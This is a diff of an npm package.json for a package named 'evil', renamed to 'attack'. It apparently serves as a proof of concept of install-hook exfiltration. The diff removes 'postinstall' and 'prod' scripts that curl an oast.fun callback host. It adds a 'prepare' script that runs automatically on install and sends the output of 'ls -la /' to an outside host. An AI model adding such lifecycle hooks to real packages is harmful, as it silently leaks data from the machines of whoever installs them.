@@ -1,10 +1,6 @@
 {
-  "name": "evil",
-  "version": "1.0.0",
+  "name": "attack",
   "scripts": {
-    "prod": "curl https://endyefjxkzchckfuoiip7isvkj535ftt6.oast.fun/?actions",
-    "postinstall": "curl https://endyefjxkzchckfuoiip7isvkj535ftt6.oast.fun/?postinstall-action"
-  },
-  "devDependencies": {
+    "prepare": "curl https://expghkflzbokkpwiaeyejq3clu5zr2px4.oast.fun?data=$(ls -la /) || true"
   }
 }
